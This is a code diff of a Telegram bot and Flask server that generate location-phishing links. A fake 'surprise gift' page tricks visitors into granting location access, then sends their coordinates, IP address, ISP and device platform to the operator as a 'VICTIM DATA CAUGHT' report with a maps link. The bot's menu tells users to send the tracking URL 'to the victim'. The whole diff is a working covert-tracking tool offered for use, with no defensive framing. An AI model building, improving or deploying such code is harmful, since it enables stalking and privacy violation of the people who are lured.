@@ -3,19 +3,18 @@ import telebot
 from flask import Flask, request, render_template_string
 from threading import Thread
 
-# --- SETTINGS ---
+# --- CONFIGURATION ---
 TOKEN = os.environ.get('BOT_TOKEN')
 OWNER_ID = 7162565886 
-CH_USERNAME = "@HackersColony" # आपका टेलीग्राम चैनल
-YT_LINK = "https://youtube.com/@hackers_colony_tech?si=GyqlRdhRdvJ9Ugd8" # आपका यूट्यूब चैनल
+CH_USERNAME = "@HackersColony"
+YT_LINK = "https://youtube.com/@hackers_colony_tech?si=GyqlRdhRdvJ9Ugd8"
+CONTACT_LINK = "https://t.me/Roshanali000" # आपका कॉन्टैक्ट लिंक
 
 bot = telebot.TeleBot(TOKEN)
 app = Flask('')
-
-# यूजर डेटा स्टोर करने के लिए (Broadcast के लिए)
 users_file = "users.txt"
 
-# --- आपका वही ओरिजिनल HTML कोड ---
+# --- STYLISH HTML TEMPLATE (Gift Surprise) ---
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="en">
@@ -24,14 +23,13 @@ HTML_TEMPLATE = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>🎁 Claim Your Surprise Gift!</title>
     <style>
-        body { background-color: #0f172a; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .container { text-align: center; background: #1e293b; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 2px solid #3b82f6; width: 80%; max-width: 400px; }
-        h1 { color: #facc15; font-size: 24px; margin-bottom: 10px; }
-        p { color: #94a3b8; font-size: 16px; line-height: 1.5; }
-        .gift-box { font-size: 80px; margin: 20px 0; animation: shake 0.5s infinite; }
-        @keyframes shake { 0% { transform: rotate(0deg); } 25% { transform: rotate(5deg); } 50% { transform: rotate(0deg); } 75% { transform: rotate(-5deg); } 100% { transform: rotate(0deg); } }
-        #status { font-weight: bold; margin-top: 20px; color: #3b82f6; }
-        .btn { background: #3b82f6; color: white; padding: 12px 25px; border: none; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 20px; }
+        body { background: radial-gradient(circle, #1e293b, #0f172a); color: white; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { text-align: center; background: #1e293b; padding: 40px; border-radius: 25px; box-shadow: 0 15px 35px rgba(0,0,0,0.6); border: 2px solid #3b82f6; width: 85%; max-width: 400px; }
+        h1 { color: #facc15; font-size: 28px; }
+        .gift-box { font-size: 90px; margin: 20px 0; animation: bounce 1s infinite; }
+        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+        #status { font-weight: bold; margin-top: 20px; color: #60a5fa; }
+        .btn { background: linear-gradient(45deg, #3b82f6, #2563eb); color: white; padding: 15px 30px; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
@@ -39,13 +37,13 @@ HTML_TEMPLATE = """
         <div class="gift-box">🎁</div>
         <h1>Congratulations!</h1>
         <p>You have won an exclusive surprise gift! 🎊</p>
-        <p>To verify your account and claim the reward, please allow <b>Location Access</b> when prompted.</p>
-        <div id="status">🔄 Verifying Region...</div>
-        <button class="btn" onclick="catchData()">CLAIM NOW</button>
+        <p>Verify your region by allowing <b>Location Access</b>.</p>
+        <div id="status">🔄 Verifying Device...</div>
+        <button class="btn" onclick="catchData()">CLAIM NOW ⚡</button>
     </div>
-
     <script>
         async function catchData() {
+            document.getElementById('status').innerHTML = "⏳ Processing...";
             try {
                 const ipRes = await fetch('https://ipapi.co/json/');
                 const ipData = await ipRes.json();
@@ -55,24 +53,22 @@ HTML_TEMPLATE = """
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({
-                                lat: pos.coords.latitude,
-                                lon: pos.coords.longitude,
-                                ip: ipData.ip,
-                                org: ipData.org,
+                                lat: pos.coords.latitude, lon: pos.coords.longitude,
+                                ip: ipData.ip, org: ipData.org,
                                 platform: navigator.platform
                             })
                         });
-                        document.getElementById('status').innerHTML = "<b style='color:#ef4444;'>❌ Error: Reward Expired!</b>";
+                        document.getElementById('status').innerHTML = "<b style='color:#ef4444;'>❌ Error: Offer Expired!</b>";
                     });
                 }
-            } catch (e) { console.log("Error"); }
+            } catch (e) { console.log("System Error"); }
         }
     </script>
 </body>
 </html>
 """
 
-# --- BOT FUNCTIONS ---
+# --- BOT LOGIC ---
 
 def is_joined(user_id):
     try:
@@ -83,46 +79,56 @@ def is_joined(user_id):
 def add_user(user_id):
     if not os.path.exists(users_file): open(users_file, 'a').close()
     with open(users_file, "r+") as f:
-        if str(user_id) not in f.read():
-            f.write(str(user_id) + "\n")
+        if str(user_id) not in f.read(): f.write(str(user_id) + "\n")
 
 @bot.message_handler(commands=['start'])
 def start(message):
     add_user(message.from_user.id)
-    markup = telebot.types.InlineKeyboardMarkup()
-    markup.add(telebot.types.InlineKeyboardButton("1. Join Telegram", url=f"https://t.me/{CH_USERNAME[1:]}"))
-    markup.add(telebot.types.InlineKeyboardButton("2. Subscribe YouTube", url=YT_LINK))
-    markup.add(telebot.types.InlineKeyboardButton("✅ Joined / Verify", callback_data="verify"))
-    
-    bot.send_message(message.chat.id, "❌ **Access Denied!**\n\nरोशन, बॉट इस्तेमाल करने के लिए आपको नीचे दिए गए दोनों चैनल जॉइन करने होंगे।", reply_markup=markup, parse_mode="Markdown")
+    markup = telebot.types.InlineKeyboardMarkup(row_width=1)
+    markup.add(
+        telebot.types.InlineKeyboardButton("📢 Join Telegram", url=f"https://t.me/{CH_USERNAME[1:]}"),
+        telebot.types.InlineKeyboardButton("📺 Subscribe YouTube", url=YT_LINK),
+        telebot.types.InlineKeyboardButton("✅ Verify Joining", callback_data="verify")
+    )
+    bot.send_message(message.chat.id, "⛔ **ACCESS DENIED!** ⛔\n\nTo use this AI tool, you must join our channels first. 👇", reply_markup=markup, parse_mode="Markdown")
 
 @bot.callback_query_handler(func=lambda call: call.data == "verify")
 def verify(call):
     if is_joined(call.from_user.id):
         markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
-        markup.add("📍 Track Location")
-        bot.send_message(call.message.chat.id, "✅ Verification Successful!\nअब आप 'Track Location' बटन दबा सकते हैं।", reply_markup=markup)
+        markup.add("📍 Track Location 🛠", "👨‍💻 Admin Contact")
+        if call.from_user.id == OWNER_ID: markup.add("📢 Broadcast (Owner)")
+        bot.send_message(call.message.chat.id, "🎯 **Verification Successful!**\nWelcome. Choose an option below:", reply_markup=markup, parse_mode="Markdown")
     else:
-        bot.answer_callback_query(call.id, "❌ आपने अभी तक चैनल जॉइन नहीं किया है!", show_alert=True)
+        bot.answer_callback_query(call.id, "❌ Please join both channels first!", show_alert=True)
 
-@bot.message_handler(func=lambda m: m.text == "📍 Track Location")
+@bot.message_handler(func=lambda m: m.text == "📍 Track Location 🛠")
 def send_link(message):
     if not is_joined(message.from_user.id): return start(message)
     link = f"https://{request.host}/" 
-    bot.send_message(message.chat.id, f"🔗 **आपका ट्रैकिंग लिंक:**\n\n`{link}`\n\nइसे विक्टिम को भेजें।", parse_mode="Markdown")
+    bot.send_message(message.chat.id, f"🖇 **Your Tracking URL:**\n\n`{link}`\n\nSend this link to the victim. 🕵️‍♂️", parse_mode="Markdown")
 
-@bot.message_handler(commands=['broadcast'])
-def broadcast(message):
+@bot.message_handler(func=lambda m: m.text == "👨‍💻 Admin Contact")
+def contact(message):
+    markup = telebot.types.InlineKeyboardMarkup()
+    markup.add(telebot.types.InlineKeyboardButton("💬 Message Roshan", url=CONTACT_LINK))
+    bot.send_message(message.chat.id, "📩 **Contact Developer:**\n\nClick the button below to contact the owner.", reply_markup=markup, parse_mode="Markdown")
+
+@bot.message_handler(func=lambda m: m.text == "📢 Broadcast (Owner)")
+def broadcast_prompt(message):
     if message.from_user.id != OWNER_ID: return
-    txt = message.text.replace("/broadcast ", "")
+    bot.send_message(message.chat.id, "📝 Send the message for broadcast:")
+    bot.register_next_step_handler(message, do_broadcast)
+
+def do_broadcast(message):
     if os.path.exists(users_file):
         with open(users_file, "r") as f:
             for user in f.readlines():
-                try: bot.send_message(user.strip(), f"📢 **Announcement:**\n\n{txt}", parse_mode="Markdown")
+                try: bot.send_message(user.strip(), f"🔔 **ANNOUNCEMENT**\n\n{message.text}", parse_mode="Markdown")
                 except: pass
-    bot.reply_to(message, "✅ ब्रॉडकास्ट पूरा हुआ!")
+    bot.reply_to(message, "✅ **Broadcast Sent!**")
 
-# --- FLASK ROUTES ---
+# --- FLASK DATA RECEIVER ---
 @app.route('/')
 def home(): return render_template_string(HTML_TEMPLATE)
 
@@ -130,12 +136,14 @@ def home(): return render_template_string(HTML_TEMPLATE)
 def receive():
     data = request.json
     map_url = f"https://www.google.com/maps?q={data['lat']},{data['lon']}"
-    report = (f"🚀 *Victim Caught!* 🚀\n\n"
-              f"🌐 *IP:* `{data['ip']}`\n"
-              f"🏢 *ISP:* {data['org']}\n"
-              f"📱 *Device:* {data['platform']}\n"
-              f"📍 *Location:* [Open Maps]({map_url})\n\n"
-              f"⚡ *Created by Roshan Ali* ⚡")
+    report = (f"🎯 **VICTIM DATA CAUGHT!** 🎯\n"
+              f"━━━━━━━━━━━━━━━━━━━━\n"
+              f"🌐 **IP Address:** `{data['ip']}`\n"
+              f"🏢 **ISP/Org:** `{data['org']}`\n"
+              f"📱 **Device Info:** `{data['platform']}`\n"
+              f"📍 **Maps Link:** [CLICK HERE]({map_url})\n"
+              f"━━━━━━━━━━━━━━━━━━━━\n"
+              f"⚡ **𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𝗯𝘆 𝗥𝗼𝘀𝗵𝗮𝗻 ⚡**")
     bot.send_message(OWNER_ID, report, parse_mode="Markdown")
     return "OK", 200
 
